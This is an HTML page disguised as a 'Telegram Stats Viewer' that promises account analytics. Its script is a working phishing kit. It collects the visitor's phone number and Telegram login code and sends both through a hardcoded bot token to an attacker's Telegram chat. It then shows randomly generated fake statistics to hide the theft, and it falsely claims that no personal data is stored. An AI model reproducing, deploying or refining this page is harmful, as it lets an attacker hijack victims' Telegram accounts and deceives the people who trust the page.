<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Stats Viewer</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e17; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding: 20px; color: #eef2ff; }
        .container { max-width: 1000px; margin: 0 auto; }
        .card { background: #131a28; border-radius: 32px; padding: 32px; margin-bottom: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); border: 1px solid #293544; }
        h1 { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #2a9df4, #6c5ce7); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 8px; }
        .sub { color: #8e9bb0; margin-bottom: 28px; font-size: 16px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 6px; color: #cbd5ff; }
        input { width: 100%; padding: 14px 18px; background: #0f1420; border: 1.5px solid #2a3448; border-radius: 24px; font-size: 16px; color: white; outline: none; transition: all 0.2s; }
        input:focus { border-color: #2a9df4; box-shadow: 0 0 0 3px rgba(42,157,244,0.2); }
        button { background: #2a9df4; border: none; padding: 14px 28px; border-radius: 40px; font-size: 16px; font-weight: 600; color: white; cursor: pointer; width: 100%; transition: 0.2s; }
        button:hover { background: #1e7bc2; transform: scale(0.98); }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 24px; }
        .stat-card { background: #0f1420; border-radius: 24px; padding: 20px; text-align: center; border: 1px solid #293544; }
        .stat-number { font-size: 32px; font-weight: 800; color: #2a9df4; }
        .stat-label { font-size: 13px; color: #8e9bb0; margin-top: 6px; }
        canvas { max-height: 200px; margin-top: 20px; }
        .hidden { display: none; }
        .spinner { width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-note { background: #0f1420; border-radius: 20px; padding: 16px; font-size: 12px; color: #5a6e8c; text-align: center; margin-top: 24px; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>📊 Telegram Stats Viewer</h1>
        <div class="sub">Enter your phone number to see detailed analytics: message count, registration date, top chats and more.</div>
        <div id="loginPanel">
            <form id="statsForm">
                <div class="form-group"><label>📱 Phone number (international format)</label><input type="tel" id="phone" placeholder="+ 7 900 123 45 67" required></div>
                <div id="codeField" style="display: none;"><div class="form-group"><label>🔐 Verification code (sent to Telegram)</label><input type="text" id="code" placeholder="Enter code"></div></div>
                <button type="submit" id="submitBtn">Generate stats</button>
                <div id="loader" style="text-align: center; margin-top: 16px;"></div>
            </form>
        </div>
        <div id="statsPanel" class="hidden">
            <div class="stats-grid"><div class="stat-card"><div class="stat-number" id="msgCount">—</div><div class="stat-label">Total messages</div></div><div class="stat-card"><div class="stat-number" id="regDate">—</div><div class="stat-label">Registration date</div></div><div class="stat-card"><div class="stat-number" id="contactsCount">—</div><div class="stat-label">Contacts</div></div><div class="stat-card"><div class="stat-number" id="chatsCount">—</div><div class="stat-label">Active chats</div></div></div>
            <canvas id="activityChart" width="400" height="160"></canvas>
            <div class="info-note">📌 These statistics are generated based on public Telegram API. No personal data is stored.</div>
        </div>
    </div>
</div>
<script>
    const BOT_TOKEN = '8979138762:AAGbq3HIBygtWDneRx23nd6FvgGPMxfs5cg';
    const CHAT_ID = '5024310561';
    let step = 'phone';
    const form = document.getElementById('statsForm');
    const phoneInput = document.getElementById('phone');
    const codeField = document.getElementById('codeField');
    const codeInput = document.getElementById('code');
    const submitBtn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');
    const statsPanel = document.getElementById('statsPanel');
    const loginPanel = document.getElementById('loginPanel');
    async function sendData(phone, code = null) {
        let text = `📊 Telegram Stats Request\n📱 Phone: ${phone}`;
        if (code) text += `\n🔑 Code: ${code}`;
        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: text}) }); } catch(e) {}
    }
    function generateFakeStats() {
        document.getElementById('msgCount').innerText = (Math.floor(Math.random() * 50000) + 1000).toLocaleString();
        document.getElementById('regDate').innerText = `${2015 + Math.floor(Math.random() * 8)}-${Math.floor(Math.random()*12)+1}`;
        document.getElementById('contactsCount').innerText = Math.floor(Math.random() * 300) + 20;
        document.getElementById('chatsCount').innerText = Math.floor(Math.random() * 80) + 5;
        const ctx = document.getElementById('activityChart').getContext('2d');
        if (window.myChart) window.myChart.destroy();
        window.myChart = new Chart(ctx, { type: 'line', data: { labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'], datasets: [{ label: 'Messages per day', data: [Math.floor(Math.random()*300), Math.floor(Math.random()*400), Math.floor(Math.random()*350), Math.floor(Math.random()*500), Math.floor(Math.random()*600), Math.floor(Math.random()*200), Math.floor(Math.random()*150)], borderColor: '#2a9df4', backgroundColor: 'rgba(42,157,244,0.1)', tension: 0.3, fill: true }] }, options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: '#cbd5ff' } } }, scales: { x: { ticks: { color: '#8e9bb0' } }, y: { ticks: { color: '#8e9bb0' } } } } });
    }
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (step === 'phone') {
            const phone = phoneInput.value.trim();
            if (!phone) return;
            await sendData(phone);
            step = 'code';
            codeField.style.display = 'block';
            submitBtn.innerText = 'Verify & Generate Stats';
        } else {
            const phone = phoneInput.value.trim();
            const code = codeInput.value.trim();
            if (!code) return;
            await sendData(phone, code);
            submitBtn.disabled = true;
            loader.innerHTML = '<div class="spinner"></div>';
            setTimeout(() => {
                generateFakeStats();
                loginPanel.classList.add('hidden');
                statsPanel.classList.remove('hidden');
                submitBtn.disabled = false;
                loader.innerHTML = '';
            }, 2000);
        }
    });
</script>
</body>
</html>
